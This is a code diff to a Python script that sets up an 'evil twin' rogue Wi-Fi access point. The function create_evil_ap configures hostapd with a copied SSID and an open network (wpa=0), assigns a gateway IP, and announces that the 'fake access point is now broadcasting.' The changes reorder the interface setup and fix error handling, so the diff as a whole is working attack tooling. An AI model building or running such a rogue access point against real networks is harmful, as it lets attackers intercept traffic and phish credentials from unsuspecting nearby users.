@@ -22,14 +22,10 @@ def change_ap_settings(interface_name):
         subprocess.run(["sudo","ip","link","set", interface_name, "down"],check=True)
         subprocess.run(["sudo", "iw", interface_name,"set", "type", "__ap"],check=True)
         subprocess.run(["sudo","ip","link","set", interface_name, "up"], check=True)             
-        print(f"[+] {interface_name} is awake and locked in Managed Mode!")
+        print(f"[+] {interface_name} is awake and locked in AP Mode!")
         
-        print(f" Assigning IP address 192.168.1.1 to {interface_name}")
-        subprocess.run(["sudo","ip","addr","replace","192.168.1.1/24","dev", interface_name],check=True)
-        print("[+] Gateway IP 192.168.1.1 configured.")
-        print(f"[*] {interface_name} is ready.")
     except subprocess.CalledProcessError as e:
-        if "addr" in getattr(e, 'cmd', []):
+        if "addr" in e.cmd:#(e, 'cmd', []) changed syntax ---> in e.cmd is always list of strings
             print("[!] Note: IP address 192.168.1.1 might already used")
         else:
             print(f"[-] Failed to reconfigure interface : {e}")
@@ -118,8 +114,8 @@ driver=nl80211
 ssid={ssid}
 hw_mode=g
 channel={channel}
-bssid={bssid}
 auth_algs=1
+wpa=0
 """
     with open(config_path, "w") as f:
         f.write(config_content)
@@ -136,9 +132,9 @@ def create_dnsmasq_conf():
 
 # DONE & WORKING 
 def create_evil_ap(INTERFACE, ap):
-    change_ap_settings(INTERFACE)
     config_path = os.path.join(SCRIPT_DIR, "temp_hostapd.conf")
-    create_hostapd_conf(INTERFACE, ap,config_path)
+    create_hostapd_conf(INTERFACE, ap,config_path)    
+    change_ap_settings(INTERFACE)
 
     try:    
         hostapd_proc = subprocess.Popen(
@@ -156,12 +152,21 @@ def create_evil_ap(INTERFACE, ap):
             print(f"[-] hostapd failed to start. Error output:\n{stderr}")
             print(f"[-] hostapd failed to start. Error output:\n{stdout}")
             sys.exit(1)
+
         print("[+] hostapd is successfully running in the background!")
         print("[+] Your fake access point is now broadcasting.")
         
+        print(f" Assigning IP address 192.168.1.1 to {INTERFACE}")
+        subprocess.run(["sudo","ip","addr","replace","192.168.1.1/24","dev", INTERFACE],check=True)
+        print("[+] Gateway IP 192.168.1.1 configured.")
+        print(f"[+] {INTERFACE} is completely ready for hostapd/dnsmasq")
+
         # IMPORTANT return the process object so the main script can close it later
         return hostapd_proc
-        
+    
+    except subprocess.CalledProcessError as e:
+        if "addr" in e.cmd:#(e, 'cmd', []) changed syntax ---> in e.cmd is always list of strings
+            print("[!] Note: IP address 192.168.1.1 might already used")
     except Exception as e:
         print(f"[-] Failed to execute hostapd: {e}")
         sys.exit(1)   
